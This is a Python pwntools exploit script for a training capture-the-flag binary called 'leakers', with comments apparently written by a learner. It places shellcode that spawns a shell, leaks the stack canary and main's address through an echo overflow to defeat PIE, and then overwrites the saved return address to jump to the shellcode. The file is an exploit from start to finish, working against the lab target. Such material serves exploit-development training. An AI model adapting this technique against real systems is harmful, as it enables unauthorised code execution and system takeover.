from pwn import *
CHALL_PATH = "./leakers"
CHALL = ELF(CHALL_PATH) #new object
COMMANDS = """
brva 0x012F9
c
"""
#set breakpoint before the call to read
# we find the address of main on stack because libc_start_main receives main as parameters, and so its address is pushed on stack (if optimized, the address is directly passed on a register)!

context.arch = "amd64"

if args.GDB: 
    c = gdb.debug(CHALL_PATH,COMMANDS)
elif args.REMOTE:
    c = remote ("leakers.training.offensivedefensive.it", 8080, ssl = True)
else: 
    c = process(CHALL_PATH)


name = asm(shellcraft.sh())
c.recvuntil(b"name?\n") 
c.sendline(name)

#canary is as 0x78-0x10

payload = b"A" * (0x68 + 1)
c.recvuntil(b"Echo:")
c.send(payload)

c.recvuntil(payload)
canary = b"\x00" + c.recv(7)
print("Canary:", hex(u64(canary))) #u64 receives exactly 8 bytes and translates it into an integer

payload = b"A" * (0x68 + 6*8)
c.recvuntil(b"Echo:")
c.send(payload)

c.recvuntil(payload)
leak = c.recv(6).ljust(8, b"\x00") # memory leak of main function (its position)
# every mem address of executable is at most of 6, other ones are 0 (less significant)
CHALL.address = u64(leak) - CHALL.symbols["main"] # chall.symbols return 0x1229 (offset of function main in executable), we can't use it if we don't have symbol main
# setting chall.address is the base address
print("ELF base: ", hex(CHALL.address)) 
print("PS1: @", hex(CHALL.symbols["ps1"]))

# to reach saved RIP and overwrite it we need to go 16 bites over than canary
payload = b"A" * (0x68)
# p64 makes a number a sequence of bytes
payload += canary # overwrite canary
payload += p64 (0) # there is an empty space in stack
payload += p64 (CHALL.symbols["ps1"]) # overwrite saved RIP
c.recvuntil(b"Echo:")
c.send(payload)

c.interactive()
